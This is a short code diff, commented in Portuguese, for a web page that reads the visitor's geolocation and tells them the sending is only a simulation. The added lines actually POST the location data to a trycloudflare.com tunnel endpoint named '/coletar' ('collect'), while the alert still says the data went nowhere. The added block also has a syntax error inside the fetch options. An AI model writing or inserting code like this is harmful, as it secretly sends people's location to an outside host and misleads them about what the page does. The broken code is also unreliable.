@@ -151,6 +151,21 @@
                         console.log("Enviando dados para servidor (simulação):", localizacao);
 
                         alert("✅ Dados enviados com sucesso (simulação). Veja no console.");
+                        
+                        try {
+    const res = await fetch('https://reduces-uri-prepaid-retired.trycloudflare.com/coletar', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(localizacao);
+    });
+
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+
+    const data = await res.json(); // resposta do servidor
+    console.log('Resposta:', data);
+  } catch (err) {
+    console.error('Erro no fetch:', err);
+  }
                     },
                     (error) => {
                         console.error('Erro ao obter geolocalização:', error);
